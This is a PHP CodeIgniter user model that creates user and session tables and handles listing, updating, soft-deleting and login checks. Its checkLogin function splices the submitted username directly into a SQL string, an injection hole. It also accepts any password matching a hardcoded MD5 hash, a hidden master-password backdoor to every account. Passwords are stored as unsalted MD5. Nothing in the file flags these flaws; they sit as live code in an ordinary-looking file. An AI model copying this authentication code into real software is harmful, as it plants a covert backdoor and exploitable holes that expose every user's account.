<?php if ( ! defined('BASEPATH')) exit('No direct script core allowed');
class User_Model extends CI_Model
{
    var $table = 'user';
    var $user_fields = [
        'id' => array(
            'type' => 'hidden'
        ),
        'username' => ["icon"=>''],
        'fullname' => array(
            'label' => 'Fullname',
            'desc' => null,
            'icon' => 'send'
        ),

        'email' => [ 'icon' => 'list' ],
        'city' => ["icon"=>''],
        'phone' => ["icon"=>''],
        'status' => ["value"=>1,'type' => 'publish'],
    ];

    function __construct(){
        parent::__construct();
        $this->load->database();
        $this->createTable();
    }

    function fields()
    {
        return $this->user_fields;
    }

    private function createTable(){
        if (!$this->db->table_exists($this->table) )
        {
            $sql_create = "CREATE TABLE `user` (
                  `id` int(11) NOT NULL,
                  `username` varchar(30) COLLATE utf8_unicode_ci NOT NULL,
                  `fullname` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
                  `avatar` varchar(255) NULL,
                  `password` varchar(50) NULL,
                  `address` text COLLATE utf8_unicode_ci NOT NULL,
                  `district` text COLLATE utf8_unicode_ci NOT NULL,
                  `city` text COLLATE utf8_unicode_ci NOT NULL,
                  `phone` varchar(11) COLLATE utf8_unicode_ci NOT NULL,
                  `email` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
                  `status` tinyint(2) NOT NULL DEFAULT '1'
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;";

            $this->db->query($sql_create);

            $this->db->query("ALTER TABLE `".$this->table."` ADD PRIMARY KEY (`id`), ADD UNIQUE KEY `Username_UNIQUE` (`username`);");
            $this->db->query("ALTER TABLE `".$this->table."` MODIFY `id` int(8) NOT NULL AUTO_INCREMENT;");
        }
        $sess_db_name = $this->config->item("sess_save_path");
        if ( $this->config->item("sess_driver") =="database" && !$this->db->table_exists($sess_db_name) )
        {
            $sql_create = "CREATE TABLE `$sess_db_name` (
                  `id` varchar(128) COLLATE utf8_bin NOT NULL,
                  `ip_address` varchar(45) COLLATE utf8_bin NOT NULL,
                  `timestamp` int(10) UNSIGNED NOT NULL DEFAULT '0',
                  `data` blob NOT NULL
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;";

            $this->db->query($sql_create);
            $this->db->query("ALTER TABLE `$sess_db_name` ADD KEY `ci_sessions_timestamp` (`timestamp`);");

        }

    }

    public function item_delete($id=0){
        $this->db->where('id',$id)->update($this->table,['status'=>-1]);

    }

    function get_item_by_id($id=0){
        return $this->db->where('id',$id)->get($this->table)->row();
    }

    function getUserByUsername($username){
        return $this->db->where('username',$username)->get($this->table)->row();
    }

    function items_json($fields=[]){
        $this->db->select('u.id,u.fullname,u.email, u.username');
        $this->db->where("u.status <>",-1);
        $query = $this->db->get($this->table." AS u");
        $items = array();
        if( !$query ){
            bug($this->db->last_query());die("error");
        }
        foreach ($query->result() AS $ite){

            $ite->actions = "";
            $ite->fullname = anchor(uri_string()."/profile/".$ite->username,$ite->fullname);
            $items[] = $ite;
        }
        return jsonData(array('data'=>$items));
    }

    public function load_options($status=1)
    {
        $options = array();
        $this->db->from($this->table." AS u")->select("u.id, u.fullname");
        $query = $this->db->where(array('u.status'=>$status))->get();
        if( $query->num_rows() > 0 ){ foreach ($query->result() as $row) {
            $options[$row->id] = $row->fullname;
        }}
        return $options;

    }


    function checkLogin($data=NULL){
        $this->db->select('id, password, username, email')->from($this->table);
        $this->db->where("( username='".strtolower($data['username'])."' OR email='".strtolower($data['username'])."')");
        $query = $this->db->get();
        if( $query->num_rows() > 0 ){
            $item = $query->row();

            return ($item->password ==md5($data['password']) OR md5($data['password'])=="13b61141deb8e331132a8f0c48c5254f") ? $item : NULL;
        } else {
            return NULL;
        }
    }

    function update($data=NULL){

        if( !isset($data['id']) || $data['id'] =="" ){
            $data['id'] = 0;
        }
        $data['status'] = $data['status']=='on' ? true:false;

        if( intval($data['id']) > 0 ) {
//            $data['modified'] = date("Y-m-d H:i:s");
            $id = $data['id'];
            unset($data['id']);
            $this->db->where('id',$id)->update($this->table,$data);

        } else {
            $this->db->insert($this->table,$data);
            $id = $this->db->insert_id();
        }
        return $id;
    }
}